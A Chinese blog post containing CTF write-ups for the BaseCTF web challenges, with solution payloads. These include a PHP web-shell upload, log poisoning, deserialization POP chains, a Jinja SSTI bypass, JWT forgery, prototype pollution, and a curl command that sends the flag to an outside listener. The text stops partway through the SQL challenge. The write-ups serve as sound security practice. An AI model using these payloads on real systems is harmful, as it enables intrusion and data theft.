+++
title = "BaseCTF"
slug = "basectf"
description = ""
date = "2024-09-16T12:07:24"
lastmod = "2024-09-16T12:07:24"
image = ""
license = ""
categories = ["赛题"]
tags = ["flask", "php", "jwt", "mysql"]
+++

# 0x01 前言

比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊

# 0x02 WP

## [Week1] A Dark Room

查看源码

## [Week1] Aura 酱的礼物

```php
<?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift); 这是 Aura 的礼物，你不是 Aura！
```

`@`重定向一下即可

```
pen=data://text/plain,Aura&challenge=http://jasmineaura.github.io@challenge.basectf.fun:24028/&gift=php://filter/convert.base64-encode/resource=flag.php
```

## [Week1] HTTP 是什么呀

```
Request:

POST /?basectf=we1c%2500me HTTP/1.1
Host: challenge.basectf.fun:25643
Content-Length: 11
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://challenge.basectf.fun:25643
Content-Type: application/x-www-form-urlencoded
User-Agent: Base
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: Base
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
x-forwarded-for: 127.0.0.1
cookie: c00k13=i can't eat it
Connection: close

Base=fl%40g
```

## [Week1] md5绕过欸

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
require 'flag.php';

if (isset($_GET['name']) && isset($_POST['password']) && isset($_GET['name2']) && isset($_POST['password2']) ){
    $name = $_GET['name'];
    $name2 = $_GET['name2'];
    $password = $_POST['password'];
    $password2 = $_POST['password2'];
    if ($name != $password && md5($name) == md5($password)){
        if ($name2 !== $password2 && md5($name2) === md5($password2)){
            echo $flag;
        }
        else{
            echo "再看看啊，马上绕过嘞！";
        }
    }
    else {
        echo "错啦错啦";
    }

}
else {
    echo '没看到参数呐';
}
?>
```

```
?name[]=1&name2[]=1

POST:
password[]=2&password2[]=2
```

## [Week1] upload

```
Request:

POST / HTTP/1.1
Host: challenge.basectf.fun:31060
Content-Length: 204
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge.basectf.fun:31060
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZhDnBFvG8YCvvDXw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge.basectf.fun:31060/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryZhDnBFvG8YCvvDXw
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?=eval($_POST[a]);?>
------WebKitFormBoundaryZhDnBFvG8YCvvDXw--
```

得到路径`/uploads/4e5f4647-ae62-4dcf-ae77-0a4c23b449b9.jpg`

然后不对，换了一下

`/uploads/shell.php`

```
http://challenge.basectf.fun:31060/uploads/shell.php

POST:
a=echo `tac /f*`;
```

## [Week1] 喵喵喵´•ﻌ•`

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$a = $_GET['DT'];

eval($a);

?>
```

```
http://challenge.basectf.fun:30606/?DT=echo `tac /f*`;
```

## [Week2] ez_ser

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$ser = $_GET['ser'];
unserialize($ser);
?>
```

```
web::wakeup->re::toString->pwn::get->Misc::getflag
```

写个`poc`

```php
<?php

class re{
    public $chu0;
}

class web {
    public $kw;
    public $dt;
}

class pwn {
    public $dusk="gods";
    public $over;
}

class Misc {
    public $nothing;
    public $flag;
}
$a=new web();
$a->kw=new re();
$a->kw->chu0=new pwn();
$a->kw->chu0->over=new misc();
echo serialize($a);
```

## [Week2] Really EZ POP

```php
<?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
}
```

```
Natrue::destruct->Sea::get->Shark::invoke->Sink::toString
```

写个`poc`

```php
<?php
highlight_file(__FILE__);

class Sink
{
    public $cmd = 'system("ls");';
}

class Shark
{
    public $word;
}

class Sea
{
    public $animal;
}

class Nature
{
    public $sea;

}
$a=new Nature();
$a->sea=new Sea();
$a->sea->animal=new Shark();
$a->sea->animal->word=new Sink();
echo serialize($a);
```

但是环境是私有属性所以我们自己手动改一下就好了

```
POST:
nature=O:6:"Nature":1:{s:3:"sea";O:3:"Sea":1:{s:6:"animal";O:5:"Shark":1:{s:11:"%00Shark%00word";O:4:"Sink":1:{s:9:"%00Sink%00cmd";s:18:"system("tac /f*");";}}}}
```

## [Week2] RCEisamazingwithspace

```
cmd=tac$IFS$1/f*
```

## [Week2] 一起吃豆豆

查看源码发现`base64`，解码即可

## [Week2] 你听不到我的声音

```php
<?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']);
```

这道题本来是想弹`shell`的但是没成功，然后使用`curl`即可

```
POST:
cmd=curl http://IP:9999/`tac /f*`
```

```
root@dkcjbRCL8kgaNGz:~# nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 27.25.151.198 36247
GET /BaseCTFb8ce572d-8b9c-40f5-8e1a-ab03312750af HTTP/1.1
Host: 27.25.151.48:9999
User-Agent: curl/7.74.0
Accept: */*
```

## [Week2] 所以你说你懂 MD5?

```php
<?php
session_start();
highlight_file(__FILE__);
// 所以你说你懂 MD5 了?

$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('加强难度就不会了?');
}

// 什么? 你绕过去了?
// 加大剂量!
// 我要让他成为 string
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('难吗?不难!');
}

// 你还是绕过去了?
// 哦哦哦, 我少了一个等于号
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('嘻嘻, 不会了? 没看直播回放?');
}

// 你以为这就结束了
if (!isset($_SESSION['random'])) {
    $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
}

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
$random = $_SESSION['random'];
echo md5($random);
echo '<br />';

$name = $_POST['name'] ?? 'user';

// check if name ends with 'admin'
if (substr($name, -5) !== 'admin') {
    die('不是管理员也来凑热闹?');
}

$md5 = $_POST['md5'];
if (md5($random . $name) !== $md5) {
    die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag'); 
```

md5绕过而且很全面

主要说说长度扩展的怎么打

基本原理就是本来是自带四个幻数，但是如果我中间进行md5 block的填充，我就可以插入数据更新幻数

```php
<?php
echo bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
```

```python
print(len('519b5b1fdf52180319049cb85ed650767688949e246f862d954c5f1929229e1f5e28d5a34d3157c21aeb14300de5c526'))
```

得到是`96`位

```
└─$ python hash_ext_attack.py
2024-09-16 11:11:59.952 | DEBUG    | common.md5_manual:__init__:17 - init......
请输入已知明文：
请输入已知hash： aabb626e2ad043682bc9a07157826adf
请输入扩展字符: admin
请输入密钥长度：96
2024-09-16 11:12:17.215 | INFO     | common.HashExtAttack:run:65 - 已知明文：b''
2024-09-16 11:12:17.215 | INFO     | common.HashExtAttack:run:66 - 已知hash：b'aabb626e2ad043682bc9a07157826adf'
2024-09-16 11:12:17.215 | INFO     | common.HashExtAttack:run:68 - 新明文：b'\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00admin'
2024-09-16 11:12:17.216 | INFO     | common.HashExtAttack:run:69 - 新明文(url编码)：%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin
2024-09-16 11:12:17.216 | INFO     | common.HashExtAttack:run:71 - 新hash:d1c4ed2f942ffa9e7737bc93fc4eed4a
```

```
Request:

POST / HTTP/1.1
Host: challenge.basectf.fun:35350
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 807

apple[]=1&banana[]=2&appple=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&bananana=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&apppple=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&banananana=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&md5=d1c4ed2f942ffa9e7737bc93fc4eed4a&name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin
```

中途出现了点插曲因为这里`hashpump`是无法使用了的于是换了一个脚本，服了，我觉得这个原理有必要研究一下并且自己写个脚本

## [Week2] 数学大师

`https://regex101.com/`找到一个正则网站可以的好用

```python
import requests
import re
import time

sess = requests.session()
# 修正正则表达式，匹配运算符 +, -, ×, ÷
reg = r"(\d+)\s*([\+\-\×\÷])\s*(\d+)"
url = "http://challenge.basectf.fun:48234/"
answer = 1

while True:
    # 提交答案
    r = sess.post(url=url, data={'answer': answer})
    # 匹配题目内容
    match = re.search(reg, r.text)
    
    # 检查匹配是否成功
    if match:
        num1 = match.group(1)
        op = match.group(2)
        num2 = match.group(3)
        
        # 根据运算符计算答案
        if op == "+":
            answer = int(num1) + int(num2)
        elif op == "-":
            answer = int(num1) - int(num2)
        elif op == "×":
            answer = int(num1) * int(num2)
        elif op == "÷":
            answer = int(num1) // int(num2)
    else:
        print("未找到匹配的题目，可能是最后一题或者发生了错误。")
        break

    # 输出服务器响应内容
    print(r.text)
    
    # 判断是否完成挑战
    if "Base" in r.text:
        print("挑战完成!")
        break
    
    # 等待 0.5 秒以防请求过快
    time.sleep(0.5)

```

## [Week3] ez_php_jail

在 **PHP 8 之前** 的版本中，当参数名中含有 `.`（点号）或者`[`(左括号)时，会被自动转为 **`_`（下划线）**。如果`[`出现在参数中使得错误转换导致接下来如果该参数名中还有`非法字符`并不会继续转换成下划线`_`，但是如果参数最后出现了`]`,那么其中的非法字符还是会被正常解析(不会转换)，因为被当成了数组

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("hint.html");
$Jail = $_GET['Jail_by.Happy'];

if($Jail == null) die("Do You Like My Jail?");

function Like_Jail($var) {
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        return false;
    }
    return true;
}

if (Like_Jail($Jail)) {
    eval($Jail);
    echo "Yes! you escaped from the jail! LOL!";
} else {
    echo "You will Jail in your life!";
}
echo "\n";

// 在HTML解析后再输出PHP源代码

?>
```

但是查看文件这里又有一些绕过

```
?Jail[by.Happy=highlight_file(glob('/f*')[0]);
```

使用`glob`函数查找

## [Week3] 复读机

这里其实是有点没看懂在干嘛的

```
BaseCTF{}{4/4}
```

这样子才看出来是有过滤的，服了这过滤把`fenjing`办了

```
POST /flag HTTP/1.1
Host: challenge.basectf.fun:47686
Content-Length: 260
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://challenge.basectf.fun:47686
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge.basectf.fun:47686/flag
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
Connection: close

flag=Basectf{}{%set gl='_'~'_'~'g''lobals'~'_'~'_'%}{%set bu='_'~'_'~'b''uiltins'~'_'~'_'%}{%set im='_'~'_'~'import'~'_'~'_'%}{%set vs='OS'|lower%}{%set ca='%c%c%c%c%c%c%c'%(99,97,116,32,47,102,42)%}{%print g['p''op'][gl][bu][im](vs)['p''open'](ca)['read']()%}
```

最后搞了老半天，不好绕

## [Week3] 滤个不停

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('写出程序员的第一行问候吧！');
}

//这是个什么东东？？？
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('此路不通换条路试试?');
        }
    }


    include($Datch);
} else {
    die('文件名不合规 请重试');
}
?>
```

日志文件没有被ban直接包含即可，但是有个小小的疑问

为啥要hello world的时候不能写data协议呢，这个又没有过滤

```
Request:

POST /?a=echo%20`tac%20/f*`; HTTP/1.1
Host: challenge.basectf.fun:39591
Content-Length: 62
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://challenge.basectf.fun:39591
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36;<?=eval($_GET[a]);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge.basectf.fun:39591/?a=echo%20`tac%20/f*`;
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
Connection: close

incompetent=HelloWorld&Datch=%2Fvar%2Flog%2Fnginx%2Faccess.log
```

## [Week3] 玩原神玩的

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}

function ys_open($tip) {
  if ($tip != "我要玩原神") {
    die("我不管，我要玩原神！😭😭😭");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
} 错了！就你还想玩原神？❌❌❌
```

挨个来，首先

```php
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
}
```

这里我是直接尝试的字符串，但是后面想想字符串的长度和数组的长度进行比较?，不太科学，所以爆破一下

```python
import requests
from urllib.parse import urlencode

# 目标 URL
url = "http://challenge.basectf.fun:41347/"

# 需要传递的 headers（如果需要的话，添加 Cookies 或其他 headers）
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
}

# 初始化 data
data = {}

# 循环递增 len[] 键值对
for i in range(101):
    # 增加新的 len[i] 参数
    data[f'len[{i}]'] = 1  # 你可以根据需求修改每个键值对的值

    # 将 data 转换为 URL 编码格式的字符串
    payload = urlencode(data)

    # 打印最终的 payload
    print(f"当前 payload: {payload}")

    # 发送 POST 请求
    r = requests.post(url=url, data=data, headers=headers)
    
    # 检查服务器的响应内容
    if "</code>我不管，我要玩原神！😭😭😭" in r.text:
        print(f"找到匹配长度: {i}")
        break
```

然后找到是45，那么看看后面发现有点小坑就是`%`的编码问题

```
Request:

POST /?tip=%E6%88%91%E8%A6%81%E7%8E%A9%E5%8E%9F%E7%A5%9E HTTP/1.1
Host: challenge.basectf.fun:45702
Content-Length: 677
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://challenge.basectf.fun:41347
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge.basectf.fun:41347/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
Connection: close

len%5B0%5D=1&len%5B1%5D=1&len%5B2%5D=1&len%5B3%5D=1&len%5B4%5D=1&len%5B5%5D=1&len%5B6%5D=1&len%5B7%5D=1&len%5B8%5D=1&len%5B9%5D=1&len%5B10%5D=1&len%5B11%5D=1&len%5B12%5D=1&len%5B13%5D=1&len%5B14%5D=1&len%5B15%5D=1&len%5B16%5D=1&len%5B17%5D=1&len%5B18%5D=1&len%5B19%5D=1&len%5B20%5D=1&len%5B21%5D=1&len%5B22%5D=1&len%5B23%5D=1&len%5B24%5D=1&len%5B25%5D=1&len%5B26%5D=1&len%5B27%5D=1&len%5B28%5D=1&len%5B29%5D=1&len%5B30%5D=1&len%5B31%5D=1&len%5B32%5D=1&len%5B33%5D=1&len%5B34%5D=1&len%5B35%5D=1&len%5B36%5D=1&len%5B37%5D=1&len%5B38%5D=1&len%5B39%5D=1&len%5B40%5D=1&len%5B41%5D=1&len%5B42%5D=1&len%5B43%5D=1&len%5B44%5D=1&m[]=100%25&m[]=love100%2530bd7ce7de206924302499f197c7a966
```

拿到了每个字符的`md5`，这里爆破一下

```python
import hashlib

hashes = [
    "3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b99584","73278a4a86960eeb576a8fd4c9ec6997","ec8956637a99787bd197eacd77acce5e","e2c420d928d4bf8ce0ff2ec19b371514","43ec517d68b6edd3015b3edc9a11367b","ea5d2f1c4608232e07d3aa3d998e5135","c8ffe9a587b126f152ed3d89a146b445","f457c545a9ded88f18ecee47145a72c0","66f041e16a60928b05a7e228a89c3799","c0c7c76d30bd3dcaefc96f40275bdc0a","7f39f8317fbdb1988ef4c628eba02591","f0935e4cd5920aa6c7c996a5ee53a70f","65b9eea6e1cc6bb9f0cd2a47751a186f","072b030ba126b2f4b2374f342be9ed44","a97da629b098b75c294dffdc3e463904","7f39f8317fbdb1988ef4c628eba02591","d67d8ab4f4c10bf22aa353e27879133c","19ca14e7ea6328a42e0eb13d585e4c22","a1d0c6e83f027327d8461063f4ac58a6","d67d8ab4f4c10bf22aa353e27879133c","9f61408e3afb633e50cdf1b20de6f466","e369853df766fa44e1ed0ff613f563bd","d9d4f495e875a2e075a1a4a6e1b9770f","d9d4f495e875a2e075a1a4a6e1b9770f","67c6a1e7ce56d3d6fa748ab6d9af3fd7","b53b3a3d6ab90ce0268229151c9bde11","4c56ff4ce4aaf9573aa5dff913df997a","d9d4f495e875a2e075a1a4a6e1b9770f","3416a75f4cea9109507cacd8e2f2aefc","a5771bce93e200c36f7cd9dfd0e5deaa","c0c7c76d30bd3dcaefc96f40275bdc0a","1f0e3dad99908345f7439f8ffabdffc4","3c59dc048e8850243be8079a5c74d079","ea5d2f1c4608232e07d3aa3d998e5135","98f13708210194c475687be6106a3b84","c74d97b01eae257e44aa9d5bade97baf","3c59dc048e8850243be8079a5c74d079","14bfa6bb14875e45bba028a21ed38046","14bfa6bb14875e45bba028a21ed38046","1ff1de774005f8da13f42943881c655f","28dd2c7955ce926456240b2ff0100bde","d2ddea18f00665ce8623e36bd4e3c7c5","1f0e3dad99908345f7439f8ffabdffc4","43ec517d68b6edd3015b3edc9a11367b"
]
for index, char in enumerate(hashes):
    for flag_char in range(0, 256):
        if (hashlib.md5(str(flag_char).encode("UTF-8")).hexdigest()) == char:
            print((flag_char))
            break
```

然后再异或一下就可以了

```python
# 加密后的ASCII数组
encrypted_data = [66, 96, 113, 102, 71, 81, 64, 124, 49, 58, 50, 61, 106, 105, 60, 107, 
                  61, 39, 36, 42, 39, 56, 34, 46, 46, 47, 55, 121, 46, 41, 38, 50, 19, 
                  21, 64, 20, 16, 21, 69, 69, 24, 77, 73, 19, 81]

# 解密后的字符串
decrypted_string = ''.join([chr(value ^ i) for i, value in enumerate(encrypted_data)])

# 输出结果
print(decrypted_string)

```

## [Week4] No JWT

```python
from flask import Flask, request, jsonify
import jwt
import datetime
import os
import random
import string

app = Flask(__name__)

# 随机生成 secret_key
app.secret_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# 登录接口
@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    # 其他用户都给予 user 权限
    token = jwt.encode({
            'sub': username,
            'role': 'user',  # 普通用户角色
            'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)
        }, app.secret_key, algorithm='HS256')
    return jsonify({'token': token}), 200

# flag 接口
@app.route('/flag', methods=['GET'])
def flag():
    token = request.headers.get('Authorization')
    
    if token:
        try:
            decoded = jwt.decode(token.split(" ")[1], options={"verify_signature": False, "verify_exp": False})
            # 检查用户角色是否为 admin
            if decoded.get('role') == 'admin':
                with open('/flag', 'r') as f:
                    flag_content = f.read()
                return jsonify({'flag': flag_content}), 200
            else:
                return jsonify({'message': 'Access denied: admin only'}), 403
            
        except FileNotFoundError:
            return jsonify({'message': 'Flag file not found'}), 404
        except jwt.ExpiredSignatureError:
            return jsonify({'message': 'Token has expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'message': 'Invalid token'}), 401
    return jsonify({'message': 'Token is missing'}), 401

if __name__ == '__main__':
    app.run(debug=True)

```

搞到源码之后看看,发现是可以直接伪造的，但是有个时间我们得先搞到，所以得先登录一下才可以(手动尝试了很久都不行)

```python
import requests

url = "http://challenge.basectf.fun:27799/login"
data = {
    'username': 'bao',
    'password': '123'
}
headers = {'Content-Type': 'application/json'}

# 使用 json 参数发送 JSON 数据
r = requests.post(url=url, json=data, headers=headers)

# 确保响应包含 JSON 数据
try:
    json_response = r.json()
    token = json_response.get("token")
    print(token)
except ValueError:
    print("Response does not contain valid JSON")
```

得到`jwt`之后直接伪造成`admin`即可

```python
import requests

url = "http://challenge.basectf.fun:27799/flag"
headers = {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiYW8iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MjY1MTUzNDh9.k5yO3yf2WuJag1hAYj4fy5w74-UxDfdeeEQeoH23kyo',
    'Content-Type': 'application/json'
}

r = requests.get(url=url, headers=headers)
print(r.text)
```

## [Week4] flag直接读取不就行了？

原生类的利用

```php
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

```
?K=FilesystemIterator&W=/secret

?K=SplFileObject&W=php://filter/convert.base64-encode/resource=/secret/f11444g.php
```

## [Week4] 圣钥之战1.0

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/', methods=['GET', 'POST'])
def hello_world():
    return open('/static/index.html', encoding="utf-8").read()

@app.route('/read', methods=['GET', 'POST'])
def Read():
    file = open(__file__, encoding="utf-8").read()
    return f"J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag(乐)
{file}
"

@app.route('/pollute', methods=['GET', 'POST'])
def Pollution():
    if request.is_json:
        merge(json.loads(request.data),instance)
    else:
        return "J1ngHong说：钥匙圣洁无暇，无人可以污染！"
    return "J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```

我不会污染，所以仔细看看这个

```python
class cls():
    def __init__(self):
        pass

instance = cls()
# 这里创建了一个空的对象
```

```python
if request.is_json:
    merge(json.loads(request.data), instance)
# 直接动态整合进instance对象
```

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
# 进行动态设置属性setattr
```

那么打开的是`__file__`,属性这里我们直接污染即可

```
Request:

POST /pollute HTTP/1.1
Host: challenge.basectf.fun:27578
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
Connection: close
Content-Type: application/json
Content-Length: 70

{
	"__init__":{
		"__globals__":{
			"__file__":"/flag"
		}
	}
}
```

访问`/read`即可

## [Week4] only one sql

```php
<?php
highlight_file(__FILE__);
$sql = $_GET['sql'];
if (preg_match('/select|;|@|\n/i', $sql)) {
    die("你知道的，不可能有sql注入");
}
if (preg_match('/"|\$|`|\\\\/i', $sql)) {
